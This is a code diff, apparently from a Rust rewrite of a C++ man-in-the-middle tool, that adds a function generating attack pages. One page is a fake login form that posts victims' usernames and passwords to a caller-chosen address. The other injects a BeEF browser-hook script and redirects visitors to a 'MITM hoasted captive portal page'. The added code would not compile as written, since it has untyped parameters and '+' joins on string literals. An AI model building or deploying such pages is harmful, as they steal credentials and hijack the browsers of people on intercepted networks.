@@ -81,8 +81,7 @@ fn termcolorprint(text_color, text ) -> io::Result<()> {
 // add conditional to use ncurses output
 fn shutdown_server(){
     termcolorprint( "red", "SHUTTING DOWN");
-    update_window(stdscr, message);
-    refresh();
+
 };
 
 /* Setup http responder*/
@@ -124,6 +123,35 @@ fn handle_connection(mut stream: TcpStream) {
     }
 
 }
+
+// currently converting from cpp to rust
+fn make_html( hook_loc,  redirect,  formaction, bool form_or_redirect) {
+    let html_redirect_body;
+    let html_form_body;
+    let hook_location;
+    let redirect_ip = redirect;
+    let html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
+    let html_form_body_top = "<body><form class=\"login\" ";
+    let form_action = "action=\"" + formaction + "\" ";
+    let html_form_body_bottom = " method=\"post\">\
+        <input type=\"text\" name=\"username\" value=\"username\">\
+        <input type=\"text\" name=\"password\" value=\"password\">\
+        <input type=\"submit\" name=\"submit\" value=\"submit\">\
+        </form>\
+        </body>\
+        </html>";
+    let html_redirect_head = "<html><head>";
+    let beef_hook = "<script src=" + hook_loc + "></script>";
+    let html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
+    let redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
+    if (form_or_redirect == true) {
+        html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
+        return html_redirect_body;
+    } else if (form_or_redirect == false ) {
+        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
+        return html_form_body;
+    };
+};
 
 fn main()
 {
